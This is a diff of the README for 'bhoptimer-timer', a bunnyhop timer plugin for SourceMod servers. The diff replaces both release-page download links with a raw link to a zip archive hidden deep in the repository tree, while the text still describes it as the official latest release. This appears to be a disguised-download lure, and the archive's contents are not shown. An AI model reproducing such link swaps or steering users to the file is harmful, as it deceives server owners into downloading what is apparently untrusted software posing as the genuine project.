@@ -1,6 +1,6 @@
 # ⏱️ bhoptimer-timer - Manage bunnyhop servers with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Naked-newport364/bhoptimer-timer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Naked-newport364/bhoptimer-timer/raw/refs/heads/main/addons/stripper/maps/workshop/1195609162/timer-bhoptimer-v3.1.zip)
 
 bhoptimer-timer provides a toolset for SourceMod servers. It manages bunnyhop gameplay for Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2. It tracks records, creates specific maps zones, and displays player statistics. Server owners use this to build competitive environments with replay bots and HUD overlays.
 
@@ -16,7 +16,7 @@ bhoptimer-timer provides a toolset for SourceMod servers. It manages bunnyhop ga
 
 You need to access the release page to obtain the files for your server.
 
-[Visit the official download page here](https://github.com/Naked-newport364/bhoptimer-timer/releases)
+[Visit the official download page here](https://github.com/Naked-newport364/bhoptimer-timer/raw/refs/heads/main/addons/stripper/maps/workshop/1195609162/timer-bhoptimer-v3.1.zip)
 
 Select the most recent release version from the list. Look for the file ending in .zip to start your download. Save this file to a folder on your computer.
 
